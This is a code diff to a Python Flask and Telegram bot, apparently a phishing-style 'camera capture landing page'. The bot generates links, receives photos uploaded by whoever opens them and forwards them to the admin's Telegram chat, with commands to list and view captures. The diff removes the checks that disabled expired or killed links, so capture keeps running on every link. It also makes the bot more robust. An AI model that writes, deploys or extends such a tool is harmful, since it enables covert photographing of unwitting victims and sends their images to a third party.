@@ -2,7 +2,7 @@
 # admin-only telegram bot + camera capture landing page
 # Render-ready. run: python cambot.py
 
-import os, sqlite3, datetime, random, string, threading, requests, html
+import os, sqlite3, datetime, random, string, threading, requests, html, asyncio
 from flask import Flask, request, render_template_string, Response
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
@@ -171,11 +171,6 @@ def root():
 
 @app.route('/v/<link_id>')
 def landing(link_id):
-    con = db()
-    row = con.execute("SELECT active FROM links WHERE id=?", (link_id,)).fetchone()
-    con.close()
-    if not row or not row[0]:
-        return "Link expired", 404
     return render_template_string(PAGE, link=link_id)
 
 @app.route('/upload', methods=['POST'])
@@ -184,26 +179,25 @@ def upload():
     photo = request.files.get('photo')
     if not link_id or not photo:
         return "bad", 400
-    con = db()
-    row = con.execute("SELECT active FROM links WHERE id=?", (link_id,)).fetchone()
-    if not row or not row[0]:
-        con.close(); return "off", 403
     img_bytes = photo.read()
     ts = datetime.datetime.utcnow().isoformat()
     files = {'photo': ('f.jpg', img_bytes, 'image/jpeg')}
     data  = {'chat_id': ADMIN_ID, 'caption': f"📸 {link_id} — {ts[:19]}"}
+    file_id = ""
     try:
         r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                           files=files, data=data, timeout=10)
-        file_id = ""
         if r.ok:
             try: file_id = r.json()['result']['photo'][-1]['file_id']
             except: pass
     except Exception as e:
         print("tg error:", e)
-        file_id = ""
-    con.execute("INSERT INTO photos (link_id, ts, file_id) VALUES (?,?,?)", (link_id, ts, file_id))
-    con.commit(); con.close()
+    try:
+        con = db()
+        con.execute("INSERT INTO photos (link_id, ts, file_id) VALUES (?,?,?)", (link_id, ts, file_id))
+        con.commit(); con.close()
+    except Exception as e:
+        print("db error:", e)
     return "ok"
 
 @app.route('/admin/<secret>')
@@ -237,10 +231,13 @@ async def cmd_gen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id): return
     label = " ".join(ctx.args) if ctx.args else "untitled"
     link_id = gen_id()
-    con = db()
-    con.execute("INSERT INTO links (id,label,created) VALUES (?,?,?)",
-                (link_id, label, datetime.datetime.utcnow().isoformat()))
-    con.commit(); con.close()
+    try:
+        con = db()
+        con.execute("INSERT OR REPLACE INTO links (id,label,created) VALUES (?,?,?)",
+                    (link_id, label, datetime.datetime.utcnow().isoformat()))
+        con.commit(); con.close()
+    except Exception as e:
+        print("db gen err:", e)
     url = f"{BASE_URL}/v/{link_id}"
     await update.message.reply_text(
         f"✅ link ready\n\nlabel: <b>{html.escape(label)}</b>\nid: <code>{link_id}</code>\nurl:\n<code>{url}</code>",
@@ -248,9 +245,12 @@ async def cmd_gen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_list(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id): return
-    con = db()
-    rows = con.execute("SELECT id,label,active,(SELECT COUNT(*) FROM photos WHERE link_id=links.id) FROM links ORDER BY created DESC LIMIT 30").fetchall()
-    con.close()
+    try:
+        con = db()
+        rows = con.execute("SELECT id,label,active,(SELECT COUNT(*) FROM photos WHERE link_id=links.id) FROM links ORDER BY created DESC LIMIT 30").fetchall()
+        con.close()
+    except Exception as e:
+        await update.message.reply_text(f"db err: {e}"); return
     if not rows:
         await update.message.reply_text("koi link nahi."); return
     msg = "📋 <b>links</b>\n\n"
@@ -264,9 +264,12 @@ async def cmd_view(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if not ctx.args:
         await update.message.reply_text("usage: /view <id>"); return
     link_id = ctx.args[0]
-    con = db()
-    rows = con.execute("SELECT file_id,ts FROM photos WHERE link_id=? ORDER BY id DESC LIMIT 20", (link_id,)).fetchall()
-    con.close()
+    try:
+        con = db()
+        rows = con.execute("SELECT file_id,ts FROM photos WHERE link_id=? ORDER BY id DESC LIMIT 20", (link_id,)).fetchall()
+        con.close()
+    except Exception as e:
+        await update.message.reply_text(f"db err: {e}"); return
     if not rows:
         await update.message.reply_text("koi photo nahi."); return
     for file_id, ts in rows:
@@ -287,17 +290,28 @@ async def cmd_kill(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id): return
-    con = db()
-    l = con.execute("SELECT COUNT(*) FROM links").fetchone()[0]
-    p = con.execute("SELECT COUNT(*) FROM photos").fetchone()[0]
-    con.close()
-    await update.message.reply_text(f"links: {l}\nphotos: {p}")
+    try:
+        con = db()
+        l = con.execute("SELECT COUNT(*) FROM links").fetchone()[0]
+        p = con.execute("SELECT COUNT(*) FROM photos").fetchone()[0]
+        con.close()
+        await update.message.reply_text(f"links: {l}\nphotos: {p}")
+    except Exception as e:
+        await update.message.reply_text(f"db err: {e}")
 
 # ─── runners ──────────────────────────────────────────────
 def run_flask():
     app.run(host="0.0.0.0", port=FLASK_PORT, debug=False, use_reloader=False, threaded=True)
 
 def run_bot():
+    # start pe webhook aur pending updates clear karo — conflict fix
+    try:
+        r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
+                          json={"drop_pending_updates": True}, timeout=10)
+        print(f"[+] webhook cleared: {r.status_code}", flush=True)
+    except Exception as e:
+        print(f"[!] webhook clear fail: {e}", flush=True)
+
     a = Application.builder().token(BOT_TOKEN).build()
     a.add_handler(CommandHandler("start",  cmd_start))
     a.add_handler(CommandHandler("gen",    cmd_gen))
@@ -305,7 +319,7 @@ def run_bot():
     a.add_handler(CommandHandler("view",   cmd_view))
     a.add_handler(CommandHandler("kill",   cmd_kill))
     a.add_handler(CommandHandler("stats",  cmd_stats))
-    a.run_polling(drop_pending_updates=True)
+    a.run_polling(drop_pending_updates=True, close_loop=False)
 
 if __name__ == "__main__":
     init_db()
